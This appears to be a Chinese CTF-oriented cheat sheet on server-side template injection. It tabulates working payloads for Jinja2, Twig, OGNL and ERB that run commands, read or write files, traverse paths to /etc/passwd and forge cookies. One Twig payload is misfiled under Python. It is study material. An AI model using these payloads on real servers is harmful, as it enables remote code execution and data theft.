# 服务器端模板注入（SSTI）题目类型与利用技巧总结

SSTI 攻击的核心是欺骗服务器，让其将用户输入作为**模板引擎的指令**而不是普通数据进行解析和执行。

## 一、 SSTI 漏洞的检测与确认技巧

在开始具体的漏洞利用之前，首先必须确认是否存在模板注入，并初步判断所使用的**模板引擎类型**。

| 目标/类型 | 技巧/手法 | 示例 Payload (Jinja2/Twig 风格) |
| :--- | :--- | :--- |
| **基础算术检测** | 注入简单数学表达式。如果结果被计算并返回（如 49），则确认存在模板解析。这是最基础的检测方法。 | `{{7*7}}` 或 `{{ 7|add:7 }}` |
| **环境差异测试** | 尝试注入不同模板引擎的独特语法，根据服务器的报错信息或解析结果来确定具体的模板引擎（如 Jinja2/Twig 使用 `{{...}}`，ERB 使用 `<%=...%>`，OGNL 使用 `%{...}` 或 `#...`）。 | `{% if 7*7 == 49 %}TEST{% endif %}` |
| **URL 编码** | 在 GET 或 POST 参数中注入 Payload 时，通常需要对特殊字符进行 **URL 编码** (`{` 为 `%7B`，`*` 为 `%2A`)，以确保 Payload 完整地到达模板引擎进行解析。 | `?name=%7B%7B7%2A7%7D%7D` |

## 二、 针对不同语言和引擎的远程代码执行（RCE）技巧

一旦确认了模板引擎类型，攻击者会尝试进行**沙箱逃逸**（Sandbox Escape）以实现远程代码执行（RCE）或文件操作。

### 1. Python 环境下的模板注入 (Jinja2, Flask/Django)

Python 环境通常利用其强大的**内省（Introspection）**能力，通过对象属性访问危险函数。

| 攻击目标 | 利用技巧/手法 | 核心 Payload 结构 (示例) |
| :--- | :--- | :--- |
| **RCE (Globals 链)** | 通过模板上下文中可访问的内置对象（如 `cycler` 或 `request.application`），利用 Python 的继承关系（`__class__` -> `__base__` -> `__globals__`）来访问全局命名空间，进而导入 `os` 模块执行系统命令。 | `{{ cycler.__init__.__globals__.os.popen("cat /flag").read() }}` |
| **RCE (Builtins 链)** | 直接通过 `__builtins__` 访问内置函数，如 `__import__`，用于导入 `os` 模块并执行命令。 | `{{request.application.__globals__.__builtins__.__import__('os').popen('cat /tmp/flag').read()}}` |
| **RCE (利用过滤器)** | **注册未定义过滤器回调**：利用模板引擎的环境功能，将未定义的过滤器指向 `system` 或 `os.popen` 等函数，然后调用该过滤器来执行命令。 | `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}` 或 `{{_self.env.getFilter('cat /flag.txt')}}` |
| **RCE/文件外带 (写文件)** | 将命令执行的结果写入 Web 根目录或静态文件目录（如 `/static/`）下的文件，然后通过浏览器或 `curl` 访问该文件读取结果。 | (这是命令注入中的常用手法，如 `cat /FLAG.txt > static/flag.txt`) |
| **RCE/文件包含 (模板覆盖)** | 通过文件上传功能，上传一个包含恶意 SSTI Payload 的文件，并利用目录遍历漏洞将其放置到服务器的模板目录下，然后通过某个参数引用该模板文件来触发执行。 | **上传 Payload 文件** (`{{ ... os.popen('cat /flag').read() }}`)，然后通过参数引用：`error_type=../images/pwn.html`。 |

### 2. Java 环境下的模板注入 (OGNL, Struts2)

Java 中的注入往往涉及 OGNL（Object-Graph Navigation Language）表达式，攻击者需要进行复杂的 Java 类反射调用。

| 攻击目标 | 利用技巧/手法 | 核心 Payload 结构 (示例) |
| :--- | :--- | :--- |
| **RCE (Struts2)** | 利用 Content-Type 或其他参数，通过反射绕过沙箱，构造 `java.lang.ProcessBuilder` 或类似的类来执行系统命令。 | 复杂的 OGNL 表达式，如利用 `@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` 实现 RCE。 |
| **文件读取 (Java NIO)** | 通过 OGNL 表达式调用 Java NIO API 来读取服务器上的文件内容。 | `%{new java.lang.String(@java.nio.file.Files@readAllBytes(@java.nio.file.Paths@get('/tmp/flag')))}` |
| **文件读取 (Base64 编码)** | 读取文件内容后，使用 `java.util.Base64` API 进行 Base64 编码，以便在 HTTP 响应中安全地传输二进制或特殊字符内容。 | `%{**@java.util.Base64@getEncoder().encodeToString**(@java.nio.file.Files@readAllBytes(@java.nio.file.Paths@get('/tmp/flag')))}` |
| **文件写入/重命名** | 利用 Java 的文件 API 在服务器上创建或修改文件。 | `message=%{#f=new java.io.FileWriter('/path/to/web/ping.txt'),#f.write('pong'),#f.close(),'OK'}` |
| **信息泄露** | 获取系统属性或当前工作目录。 | `message=%{@java.lang.System@getProperty('user.dir')}` |

### 3. Ruby 环境下的模板注入 (ERB)

Ruby 的 ERB 模板语法简洁，利用方式通常直观。

| 攻击目标 | 利用技巧/手法 | 核心 Payload 结构 (示例) |
| :--- | :--- | :--- |
| **RCE (文件读取)** | 直接嵌入 Ruby 代码调用 `File.read`。 | `sentence=<%= File.read('/flag') %>` |

## 三、 辅助漏洞利用与信息发现技巧

在实际的 Web 挑战中，SSTI 往往与其他漏洞或利用技术结合使用。

### 1. 路径遍历/本地文件包含 (LFI)

即使没有完整的 SSTI RCE，攻击者也会尝试利用路径遍历来读取敏感文件。

| 目标 | 技巧/手法 | 示例 Payload (URL 参数) |
| :--- | :--- | :--- |
| **读取敏感文件** | 使用 `../` 或编码形式 (`..%2f`) 遍历目录结构，读取 `/etc/passwd` 或 `/FLAG.php` 等文件。 | `filename=../../etc/passwd` |
| **读取源代码** | 利用 PHP 封装器（如 `php://filter`）来 Base64 编码服务器端的文件，以读取其源代码。 | `id=php://filter/convert.base64-encode/resource=post.php` |

### 2. 命令注入/辅助 RCE

如果模板引擎参数无法直接 RCE，但服务器将输入传递给系统命令（如 Ping 功能），则可利用**命令注入**。

| 目标 | 技巧/手法 | 
| :--- | :--- | 
| **命令执行并外带结果** | 注入命令，将结果重定向到 Web 路径下可访问的文件，然后通过 HTTP 请求读取该文件。 | 

### 3. 信息泄露与调试模式

通过修改 URL 参数或 HTTP Header，尝试触发服务器的调试模式或配置信息泄露。

| 目标 | 技巧/手法 | 示例 Payload |
| :--- | :--- | :--- |
| **触发调试信息** | 尝试在 URL 中添加常见的调试或源码参数。 | `?debug=1`, `?source=1`, `?view-source` |
| **泄露 Session 内容** | 在某些框架中，使用特定参数可以显示服务器端 Session 存储的内容，其中可能包含管理员身份或敏感路径。 | `?debug=session` |

### 4. 不安全反序列化（Insecure Deserialization）

虽然并非 SSTI，但这种漏洞属于服务器端处理用户输入并执行操作的类型，在 CTF 环境中常与 SSTI 一同出现，特别是 PHP 环境下（通过修改 Cookie）。

| 目标 | 技巧/手法 | 
| :--- | :--- |
| **Cookie 身份伪造** | 修改 Base64 编码的序列化数据（如 PHP `creds` Cookie），将 `username` 或 `is_admin` 字段改为具有更高权限的值。 
